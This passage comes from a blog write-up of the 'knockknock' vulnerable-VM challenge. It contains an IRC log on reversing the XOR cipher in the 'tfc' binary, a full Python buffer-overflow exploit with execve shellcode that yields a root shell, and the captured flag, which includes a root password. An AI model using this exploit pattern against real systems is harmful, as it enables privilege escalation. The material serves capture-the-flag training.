</span><span class='line'>[2014-10-10T22:57:56+0100] &lt;c0ne&gt; thats a way indeed
</span><span class='line'>[2014-10-10T22:58:14+0100] &lt;c0ne&gt; easier is to generate the data youself
</span><span class='line'>[2014-10-10T22:58:25+0100] &lt;c0ne&gt; data = 5000 * &#39;A&#39;
</span><span class='line'>[2014-10-10T22:59:05+0100] &lt;recrudesce&gt; ok, so a1 = 5000 * &#39;A&#39;
</span><span class='line'>[2014-10-10T22:59:07+0100] &lt;recrudesce&gt; a2 = 5000
</span><span class='line'>[2014-10-10T22:59:19+0100] &lt;recrudesce&gt; key = -367349345
</span><span class='line'>[2014-10-10T22:59:41+0100] &lt;c0ne&gt; go for the signed
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = ((unsigned int)key &gt;&gt; 1) ^ 0x6DAA1CF4;
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;       else
</span><span class='line'>[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = (unsigned int)key &gt;&gt; 1;
</span><span class='line'>[2014-10-10T22:59:54+0100] &lt;c0ne&gt; sorry unsigned
</span><span class='line'>[2014-10-10T23:00:02+0100] &lt;c0ne&gt; the code tells you how its intended
</span><span class='line'>[2014-10-10T23:15:14+0100] &lt;recrudesce&gt; so i have
</span><span class='line'>[2014-10-10T23:15:22+0100] &lt;recrudesce&gt; key = 0xEA1AB19F
</span><span class='line'>[2014-10-10T23:15:35+0100] &lt;recrudesce&gt; for i in range (0,a2/4,1) :
</span><span class='line'>[2014-10-10T23:15:44+0100] &lt;recrudesce&gt;      print a1[i] ^ key
</span><span class='line'>[2014-10-10T23:15:48+0100] &lt;recrudesce&gt; throws an error
</span><span class='line'>[2014-10-10T23:15:56+0100] &lt;recrudesce&gt; TypeError: unsupported operand type(s) for ^: &#39;str&#39; and &#39;long&#39;
</span><span class='line'>[2014-10-10T23:15:57+0100] &lt;c0ne&gt; yeah of course
</span><span class='line'>[2014-10-10T23:16:02+0100] &lt;c0ne&gt; exactly
</span><span class='line'>[2014-10-10T23:16:02+0100] &lt;recrudesce&gt; so i guess i have to cast key as long ?
</span><span class='line'>[2014-10-10T23:16:07+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T23:16:20+0100] &lt;c0ne&gt; your data, you don&#39;t treat is a integer
</span><span class='line'>[2014-10-10T23:16:24+0100] &lt;recrudesce&gt; or cast my string as long ?
</span><span class='line'>[2014-10-10T23:16:26+0100] &lt;c0ne&gt; str xor integer
</span><span class='line'>[2014-10-10T23:16:50+0100] &lt;c0ne&gt; struct lib can help you
</span><span class='line'>[2014-10-10T23:17:02+0100] &lt;recrudesce&gt; so i need to work out how to convert my string to an int
</span><span class='line'>[2014-10-10T23:17:08+0100] &lt;recrudesce&gt; convert an A to an int :/
</span><span class='line'>[2014-10-10T23:17:42+0100] &lt;c0ne&gt; x = struct.unpack_from(&#39;&lt;L&#39;, a1, (i * 4))
</span><span class='line'>[2014-10-10T23:17:43+0100] &lt;c0ne&gt; or so
</span><span class='line'>[2014-10-10T23:17:47+0100] &lt;c0ne&gt; in the loop
</span><span class='line'>[2014-10-10T23:18:22+0100] &lt;recrudesce&gt; &lt;L ?
</span><span class='line'>[2014-10-10T23:18:46+0100] &lt;c0ne&gt; little endian indeed
</span><span class='line'>[2014-10-10T23:19:07+0100] &lt;recrudesce&gt; ok, so now i get tuple and long
</span><span class='line'>[2014-10-10T23:19:21+0100] &lt;c0ne&gt; sorry
</span><span class='line'>[2014-10-10T23:19:22+0100] &lt;recrudesce&gt; rather than string and long :P
</span><span class='line'>[2014-10-10T23:19:25+0100] &lt;c0ne&gt;  x = struct.unpack_from(&#39;&lt;L&#39;, a1, (i * 4))[0]
</span><span class='line'>[2014-10-10T23:19:27+0100] &lt;c0ne&gt; better
</span><span class='line'>[2014-10-10T23:19:50+0100] &lt;recrudesce&gt; ah ok
</span><span class='line'>[2014-10-10T23:19:52+0100] &lt;recrudesce&gt; cool
</span><span class='line'>[2014-10-10T23:20:06+0100] &lt;c0ne&gt; btw
</span><span class='line'>[2014-10-10T23:20:07+0100] &lt;c0ne&gt; for i in range (0,a2/4,1) :
</span><span class='line'>[2014-10-10T23:20:14+0100] &lt;c0ne&gt; how does this works?
</span><span class='line'>[2014-10-10T23:20:21+0100] &lt;recrudesce&gt; a2 is the length
</span><span class='line'>[2014-10-10T23:20:23+0100] &lt;recrudesce&gt; 0 is start
</span><span class='line'>[2014-10-10T23:20:26+0100] &lt;recrudesce&gt; 1 is step
</span><span class='line'>[2014-10-10T23:20:29+0100] &lt;c0ne&gt; aah ok
</span><span class='line'>[2014-10-10T23:20:34+0100] &lt;recrudesce&gt; so it&#39;ll step 1 from 0 to a2/4
</span><span class='line'>[2014-10-10T23:20:43+0100] &lt;c0ne&gt; which is the same as
</span><span class='line'>[2014-10-10T23:20:46+0100] &lt;recrudesce&gt; which is essentially what you&#39;re doing with v
</span><span class='line'>[2014-10-10T23:20:47+0100] &lt;recrudesce&gt;  for ( i = 0; a2 &gt;&gt; 2 &gt; i; ++i )
</span><span class='line'>[2014-10-10T23:20:52+0100] &lt;c0ne&gt; range(a2/4)
</span><span class='line'>[2014-10-10T23:20:58+0100] &lt;recrudesce&gt; yeah, could do that too
</span><span class='line'>[2014-10-10T23:21:04+0100] &lt;c0ne&gt; it confused me
</span><span class='line'>[2014-10-10T23:21:57+0100] &lt;recrudesce&gt; if ( key &amp; 1 )
</span><span class='line'>[2014-10-10T23:22:00+0100] &lt;recrudesce&gt; wossat doing ?
</span><span class='line'>[2014-10-10T23:22:22+0100] &lt;c0ne&gt; check a bit is true or false
</span><span class='line'>[2014-10-10T23:22:22+0100] &lt;recrudesce&gt; bitwise and
</span><span class='line'>[2014-10-10T23:23:33+0100] &lt;c0ne&gt; &gt;&gt;&gt; for i in range(10):
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...     print (i &amp; 1)
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 0
</span><span class='line'>[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 1
</span><span class='line'>[2014-10-10T23:28:36+0100] &lt;c0ne&gt; now there where you do
</span><span class='line'>[2014-10-10T23:28:37+0100] &lt;c0ne&gt; print x ^ key
</span><span class='line'>[2014-10-10T23:28:59+0100] &lt;c0ne&gt; you could pack the result into a str again and append it to some output buffer
</span><span class='line'>[2014-10-10T23:29:17+0100] &lt;c0ne&gt; something like
</span><span class='line'>[2014-10-10T23:29:21+0100] &lt;c0ne&gt; outside the loop
</span><span class='line'>[2014-10-10T23:29:24+0100] &lt;c0ne&gt; r = &#39;&#39;
</span><span class='line'>[2014-10-10T23:29:50+0100] &lt;recrudesce&gt; outside which loop - the first or the 2nd ?
</span><span class='line'>[2014-10-10T23:29:52+0100] &lt;c0ne&gt; replace the print with r += struct.pack(&#39;&lt;L&#39;, (x ^ key))
</span><span class='line'>[2014-10-10T23:30:14+0100] &lt;c0ne&gt; out of the main loop
</span><span class='line'>[2014-10-10T23:30:23+0100] &lt;c0ne&gt; since you have the declare a clean buffer
</span><span class='line'>[2014-10-10T23:30:26+0100] &lt;c0ne&gt; empty
</span><span class='line'>[2014-10-10T23:31:10+0100] &lt;recrudesce&gt; ok, done
</span><span class='line'>[2014-10-10T23:31:18+0100] &lt;recrudesce&gt; then at the end, print r ?
</span><span class='line'>[2014-10-10T23:31:22+0100] &lt;recrudesce&gt; after the entire loop
</span><span class='line'>[2014-10-10T23:31:23+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:31:27+0100] &lt;c0ne&gt; or!
</span><span class='line'>[2014-10-10T23:31:42+0100] &lt;c0ne&gt; open(&#39;myfile.tfc&#39;, &#39;wb&#39;).write( r )
</span><span class='line'>[2014-10-10T23:31:52+0100] &lt;c0ne&gt; so you have it in the file
</span><span class='line'>[2014-10-10T23:32:11+0100] &lt;c0ne&gt; you need it in a file anyways
</span><span class='line'>[2014-10-10T23:32:26+0100] &lt;recrudesce&gt; ok, i just encrypted 5000 A&#39;s
</span><span class='line'>[2014-10-10T23:32:36+0100] &lt;recrudesce&gt; and it looks like it did it
</span><span class='line'>[2014-10-10T23:33:00+0100] &lt;c0ne&gt; feed it to the binary
</span><span class='line'>[2014-10-10T23:33:06+0100] &lt;c0ne&gt; and see what happens
</span><span class='line'>[2014-10-10T23:33:21+0100] &lt;recrudesce&gt; seg fault
</span><span class='line'>[2014-10-10T23:33:32+0100] &lt;c0ne&gt; on..
</span><span class='line'>[2014-10-10T23:34:01+0100] &lt;recrudesce&gt; 0x4f04c41c
</span><span class='line'>[2014-10-10T23:34:14+0100] &lt;c0ne&gt; hmm
</span><span class='line'>[2014-10-10T23:34:21+0100] &lt;c0ne&gt; try 6000 A
</span><span class='line'>[2014-10-10T23:34:25+0100] &lt;c0ne&gt; for a test
</span><span class='line'>[2014-10-10T23:34:41+0100] &lt;c0ne&gt; the original buffer is 4096
</span><span class='line'>[2014-10-10T23:34:50+0100] &lt;c0ne&gt; now that very close to that 5000
</span><span class='line'>[2014-10-10T23:35:26+0100] &lt;c0ne&gt; ooh btw
</span><span class='line'>[2014-10-10T23:35:33+0100] &lt;c0ne&gt; i see a bug in your code
</span><span class='line'>[2014-10-10T23:35:42+0100] &lt;c0ne&gt; for ( j = 0; j &lt;= 7; ++j )
</span><span class='line'>[2014-10-10T23:35:48+0100] &lt;c0ne&gt; 0 ..7 is 8
</span><span class='line'>[2014-10-10T23:35:50+0100] &lt;c0ne&gt; rounds
</span><span class='line'>[2014-10-10T23:35:56+0100] &lt;c0ne&gt; for j in range(7):
</span><span class='line'>[2014-10-10T23:36:00+0100] &lt;c0ne&gt; this is 7 rounds
</span><span class='line'>[2014-10-10T23:36:29+0100] &lt;c0ne&gt; j &lt;= 7
</span><span class='line'>[2014-10-10T23:36:35+0100] &lt;c0ne&gt; less or equal
</span><span class='line'>[2014-10-10T23:36:47+0100] &lt;recrudesce&gt; but it starts at 0
</span><span class='line'>[2014-10-10T23:36:49+0100] &lt;c0ne&gt; if it did j &lt; 7 it would be 7 rounds
</span><span class='line'>[2014-10-10T23:37:07+0100] &lt;recrudesce&gt; so i need to do 6 then
</span><span class='line'>[2014-10-10T23:37:13+0100] &lt;c0ne&gt; no
</span><span class='line'>[2014-10-10T23:37:17+0100] &lt;c0ne&gt; 8
</span><span class='line'>[2014-10-10T23:37:23+0100] &lt;c0ne&gt; for j in range(8)
</span><span class='line'>[2014-10-10T23:37:36+0100] &lt;c0ne&gt; that will go from 0 .. up till 7
</span><span class='line'>[2014-10-10T23:37:40+0100] &lt;c0ne&gt; which is 8 rounds
</span><span class='line'>[2014-10-10T23:37:49+0100] &lt;c0ne&gt; since the 0 counts to
</span><span class='line'>[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; segfault at 41414141
</span><span class='line'>[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; nice
</span><span class='line'>[2014-10-10T23:38:25+0100] &lt;c0ne&gt; now from here on i made it easy
</span><span class='line'>[2014-10-10T23:38:30+0100] &lt;c0ne&gt; exec stack
</span><span class='line'>[2014-10-10T23:38:38+0100] &lt;c0ne&gt; and even added some little helper
</span><span class='line'>[2014-10-10T23:40:14+0100] &lt;recrudesce&gt; so it&#39;s one way encryption
</span><span class='line'>[2014-10-10T23:40:19+0100] &lt;recrudesce&gt; but you can encrypt encrypted files to decrypt
</span><span class='line'>[2014-10-10T23:40:23+0100] &lt;recrudesce&gt; hahaha
</span><span class='line'>[2014-10-10T23:40:26+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:40:27+0100] &lt;c0ne&gt; xor
</span><span class='line'>[2014-10-10T23:40:36+0100] &lt;c0ne&gt; with a key mutation
</span><span class='line'>[2014-10-10T23:40:53+0100] &lt;c0ne&gt; if i used a static key of for example 16 bytes
</span><span class='line'>[2014-10-10T23:41:06+0100] &lt;c0ne&gt; you could see some pattern in the encrypted data
</span><span class='line'>[2014-10-10T23:41:14+0100] &lt;c0ne&gt; kinda revealing the key
</span><span class='line'>[2014-10-10T23:41:24+0100] &lt;c0ne&gt; so that why added a bit of math
</span><span class='line'>[2014-10-10T23:43:04+0100] &lt;c0ne&gt; you can also make it leak the key
</span><span class='line'>[2014-10-10T23:43:12+0100] &lt;c0ne&gt; feed it a file with 00 bytes
</span><span class='line'>[2014-10-10T23:45:34+0100] &lt;recrudesce&gt; eip is at 4124
</span><span class='line'>[2014-10-10T23:46:29+0100] &lt;c0ne&gt; yes
</span><span class='line'>[2014-10-10T23:48:06+0100] &lt;recrudesce&gt; ok, have control of EIP
</span><span class='line'>[2014-10-10T23:49:35+0100] &lt;c0ne&gt; now whats next ..
</span><span class='line'>[2014-10-10T23:50:04+0100] &lt;recrudesce&gt; ok, so ret2lib i guess ?
</span><span class='line'>[2014-10-10T23:50:13+0100] &lt;c0ne&gt; naah
</span><span class='line'>[2014-10-10T23:50:16+0100] &lt;c0ne&gt; even more simple
</span><span class='line'>[2014-10-10T23:50:29+0100] &lt;c0ne&gt; stack is executable
</span><span class='line'>[2014-10-10T23:50:38+0100] &lt;c0ne&gt; no need for fancy rops
</span><span class='line'>[2014-10-10T23:50:40+0100] &lt;recrudesce&gt; jump to esp
</span><span class='line'>[2014-10-10T23:50:46+0100] &lt;c0ne&gt; yeah
</span><span class='line'>[2014-10-10T23:52:15+0100] &lt;c0ne&gt; msfelfscan -j esp binaryfile
</span><span class='line'>[2014-10-10T23:53:55+0100] &lt;c0ne&gt; asm (&quot;jmp %esp&quot;);
</span><span class='line'>[2014-10-10T23:54:00+0100] &lt;c0ne&gt; added it on purpose
</span><span class='line'>[2014-10-10T23:54:06+0100] &lt;c0ne&gt; i&#39;m not that evil
</span><span class='line'>[2014-10-10T23:57:50+0100] &lt;c0ne&gt; since there isnt any more tricks down the way
</span></code></pre></td></tr></table></div></figure>


<p>So, now that you read that, this is what my Python script looks like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="c">#a1 = file contents</span>
</span><span class='line'><span class="c">#a2 = file length</span>
</span><span class='line'>
</span><span class='line'><span class="c">#f = open(&#39;input_buff.tfc&#39;, &#39;r&#39;)</span>
</span><span class='line'><span class="c">#a1 = f.read()</span>
</span><span class='line'><span class="c">#a2 = len(a1)</span>
</span><span class='line'>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&#39;</span> <span class="c">#08048d93</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">a1</span> <span class="o">=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mi">4124</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x90</span><span class="s">&#39;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
</span><span class='line'><span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span>
</span><span class='line'><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
</span><span class='line'>        <span class="n">a1</span> <span class="o">+=</span> <span class="s">&#39;Z&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">a2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="mh">0xEA1AB19F</span>
</span><span class='line'><span class="n">r</span><span class="o">=</span><span class="s">&#39;&#39;</span>
</span><span class='line'><span class="c"># now do the first for loop</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">a2</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>        <span class="n">x</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>        <span class="c">#print x ^ key</span>
</span><span class='line'>        <span class="n">r</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">key</span><span class="p">))</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">):</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x6DAA1Cf4</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                        <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'><span class="nb">open</span><span class="p">(</span><span class="s">&#39;myfile.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="n">r</span> <span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This generates a .tfc file, which when provided to the tfc application &ldquo;decrypts&rdquo;, jumps to esp and executes the shellcode, dropping us to a shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>python keyshow.py
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc ./myfile.tfc ./myfile_blah.tfc
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
</span><span class='line'><span class="c"># cd /root</span>
</span><span class='line'><span class="c"># ls -l</span>
</span><span class='line'>total 16
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">1459</span> Oct <span class="m">11</span> 18:04 crpt.py
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root <span class="m">1027</span> Oct <span class="m">10</span> 18:19 server.py
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root  <span class="m">119</span> Sep <span class="m">26</span> 12:10 start.sh
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">10</span> 20:55 the_flag_is_in_here
</span><span class='line'><span class="c"># cd the_flag_is_in_here</span>
</span><span class='line'>ls -l
</span><span class='line'><span class="c"># total 4</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">895</span> Oct <span class="m">10</span> 20:55 qQcmDWKM5a6a3wyT.txt
</span><span class='line'><span class="c"># cat qQcmDWKM5a6a3wyT.txt</span>
</span><span class='line'> __                         __              __                         __      ____
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __         <span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ /_   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  ______ <span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;  /_____/ <span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span>        <span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="p">|</span>___<span class="p">|</span>
</span><span class='line'>     <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>              <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>Hooray you got the flag!
</span><span class='line'>
</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
</span><span class='line'>
</span><span class='line'>Feel free to hit me up in <span class="c">#vulnhub @ zer0w1re</span>
</span><span class='line'>
</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
</span><span class='line'>as well as rasta_mouse, and recrudesce <span class="k">for</span> helping to find bugs and <span class="nb">test </span>the VM :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root password is <span class="s2">&quot;qVx4UJ*zcUdc9#3C$Q&quot;</span>, but you should already have a shell, right? <span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-10-26T18:42:03+00:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>